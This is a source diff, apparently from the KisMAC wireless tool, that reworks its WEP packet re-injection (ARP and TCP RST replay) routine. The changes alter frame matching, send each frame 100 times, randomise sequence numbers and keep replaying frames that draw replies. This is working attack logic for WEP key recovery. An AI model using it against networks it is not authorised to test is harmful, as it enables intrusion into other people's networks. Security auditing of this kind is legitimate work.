@@ -399,35 +399,33 @@
 
 //was originally for packet re-injection
 -(void)handleInjection:(WLFrame*) frame {
-    //only data packets are interesting for injection
+    const UInt8 BROADCAST[] = "\xFF\xFF\xFF\xFF\xFF\xFF";
+	
+	//only data packets are interesting for injection
     if (frame->frameControl & IEEE80211_TYPE_MASK != IEEE80211_TYPE_DATA) return;
-    
-    NSLog(@"datalen: %u arpsize: %u padded: %u memcmp: %u packet: %u mac1:%x:%x:%x:%x:%x:%x mac2: %x:%x:%x:%x:%x:%x mac3: %x:%x:%x:%x:%x:%x",frame->dataLen,ARP_MAX_SIZE,ARP_MIN_SIZE,memcmp(frame->address1,_MACs,12),aPacketType,frame->address1[0],frame->address1[1],frame->address1[2],frame->address1[3],frame->address1[4],frame->address1[5],frame->address2[0],frame->address2[1],frame->address2[2],frame->address2[3],frame->address2[4],frame->address2[5],frame->address3[0],frame->address3[1],frame->address3[2],frame->address3[3],frame->address3[4],frame->address3[5]);
-    
-    NSLog(@"should be mac1:%x:%x:%x:%x:%x:%x mac2: %x:%x:%x:%x:%x:%x mac3: %x:%x:%x:%x:%x:%x",_MACs[0],_MACs[1],_MACs[2],_MACs[3],_MACs[4],_MACs[5],_MACs[6],_MACs[7],_MACs[8],_MACs[9],_MACs[10],_MACs[11],_MACs[12],_MACs[13],_MACs[14],_MACs[15],_MACs[16],_MACs[17]);
-    
-    if (aPacketType) {
+        
+    if (aPacketType == 0) {
         //do rst handling here
         if ((frame->dataLen==TCPRST_SIZE) && (memcmp(frame->address1,_MACs,18)==0)) {
             goto got;
         }
-    } else if ((frame->dataLen>=ARP_MIN_SIZE) && (frame->dataLen<=ARP_MAX_SIZE)) {
-        if ((frame->frameControl & IEEE80211_DIR_TODS) && (aTODS)) {
-            if ((memcmp(frame->address1,_MACs,6)==0) && (memcmp(frame->address3,&_MACs[6],6)==0)) goto got;
-        } else if ((frame->frameControl & IEEE80211_DIR_TODS) && (!aTODS)) {
-            if ((memcmp(frame->address1,&_MACs[6],6)==0) && (memcmp(frame->address3,&_MACs[12],6)==0)) goto got;
-        } else if ((frame->frameControl & IEEE80211_DIR_FROMDS) && (aTODS)) {
-            if ((memcmp(frame->address1,&_MACs[6],6)==0) && (memcmp(frame->address2,_MACs,6)==0)) goto got;
-        } else if ((frame->frameControl & IEEE80211_DIR_FROMDS) && (!aTODS)) {
-            if ((memcmp(frame->address1,&_MACs[12],6)==0) && (memcmp(frame->address2,&_MACs[6],6)==0)) goto got;
-        }
+    } else if (frame->dataLen==ARP_SIZE || frame->dataLen == ARP_SIZE_PADDING) {
+		if (frame->frameControl & IEEE80211_DIR_TODS) {
+			if (memcmp(frame->address3, BROADCAST, 6)==0) return;
+			if (memcmp(frame->address1, _MACs, 6) != 0) return;
+		} else if (frame->frameControl & IEEE80211_DIR_FROMDS) {
+			if (memcmp(frame->address1, BROADCAST, 6)==0) return;
+			if (memcmp(frame->address2, _MACs, 6) != 0) return;
+		}
+		
+		goto got;
     }
     
     return;
     
 got:
-    NSLog(@"\nGot Packet %u\n",aInjReplies);
-    aInjReplies++;
+    NSLog(@"\nGot Packet %u\n",_injReplies);
+    _injReplies++;
 }
 
 #pragma mark -
@@ -531,7 +529,8 @@ got:
     [wd startCapture:0];
     while (aScanning) {				//this is for canceling
         frame = [wd nextFrame];                 //captures the next frame (locking)
-        if (frame==NULL) break;
+        if (frame==NULL) 
+			break;
         
         if (_injecting) {
             [self handleInjection:frame];
@@ -949,12 +948,11 @@ error:
     WaveDriver *wd = Nil;
 
     wd = [self getInjectionDriver];
-    if (!wd) return NSLocalizedString(@"No injection driver chosen!", "Error for packet reinjection");
-    
-    if ([net type] != networkTypeManaged) return NSLocalizedString(@"KisMAC can only attack managed networks!", "Error for packet reinjection");
+    NSParameterAssert(wd);
+    NSParameterAssert([net type] == networkTypeManaged);
+    NSParameterAssert([net wep] == encryptionTypeWEP || [net wep] == encryptionTypeWEP40);
     
     channel = [wd getChannel];
-    NSLocalizedString(@"No injection driver chosen!", "Error for packet reinjection");
     
     _injecting=YES;
     
@@ -968,40 +966,41 @@ error:
         if (w) p = [net arpPacketsLog];
         else   p = [net ackPacketsLog];
          
-        aPacketType=1-w;
+        aPacketType = w;
 
-        while([p count]) {
-            memset(packet,0,2364);
-            memset(helper,0,2364);
+        while([p count] > 0 && ![[WaveHelper importController] canceled]) {
+            memset(packet, 0, 2364);
+            memset(helper, 0, 2364);
             
             f = [p lastObject];
-            [f getCString:(char*)(helper+sizeof(sAirportFrame)) maxLength:2364-sizeof(sAirportFrame)];
+            [f getCString:(char*)(helper+sizeof(sAirportFrame)) maxLength: 2364 - sizeof(sAirportFrame)];
             q = [f length] - 24; // 24 is headersize of data packet
-            memcpy(packet, helper, 24+sizeof(sAirportFrame));
-            memcpy(packet+sizeof(WLFrame), y->address4, q);
+            memcpy(packet, helper, 24 + sizeof(sAirportFrame));
+            memcpy(packet +  sizeof(WLFrame), y->address4, q);
             x->dataLen = q;
-            x->length  = q;
             x->status  = 0;
             
-            debug=(struct kj*)x;
+            debug = (struct kj*)x;
             
-            memcpy(_MACs     , x->address1, 6);
-            memcpy(&_MACs[06], x->address2, 6);
-            memcpy(&_MACs[12], x->address3, 6);
-            aInjReplies=0;
+			_injReplies = 0;
             
-            if (x->frameControl & IEEE80211_DIR_FROMDS) aTODS=false;
-            else aTODS=true;
+            if (x->frameControl & IEEE80211_DIR_TODS) {
+				memcpy(_MACs, x->address1, 6);
+			} else {
+				memcpy(_MACs, x->address2, 6);
+			}
             
             x->frameControl |= IEEE80211_WEP;
+			x->sequenceControl = random() & 0x0FFF;
+			x->duration = 0;
 
-            for (q=0;q<6;q++) {
+            for (q=0;q<100;q++) {
                 if (![wd sendFrame:packet withLength:2364 atInterval:0])
                     [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
-                [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
+                [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.05]];
             }
 
-            if (aInjReplies<4) {
+            if (_injReplies<5) {
                 [p removeLastObject];
             } else {
                 [wd sendFrame:packet withLength:2364 atInterval:5];
